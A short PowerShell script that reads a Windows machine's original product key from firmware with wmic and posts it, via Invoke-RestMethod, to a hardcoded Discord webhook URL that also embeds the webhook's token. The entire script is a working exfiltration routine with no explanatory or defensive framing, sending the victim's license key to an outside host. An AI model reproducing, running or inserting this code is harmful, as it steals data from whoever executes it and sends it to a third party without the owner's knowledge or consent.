$u = 'https://discord.com/api/webhooks/1322635423369003129/Z0eJb-VnYmu33ZOYHl6ESyQybDtgZ4ODMgbV22ifsRivbQr8UZlhlISrv9O9_h8sRf3K'
$k = (wmic path softwarelicensingservice get OA3xOriginalProductKey | Select-String -Pattern '\w{5}-\w{5}-\w{5}-\w{5}-\w{5}' | foreach { $_.Matches.Value }) -join ''
$k = [string]::IsNullOrEmpty($k) ? 'No key' : $k
irm -Uri $u -Method Post -Body @{content=$k} | ConvertTo-Json -Depth 1
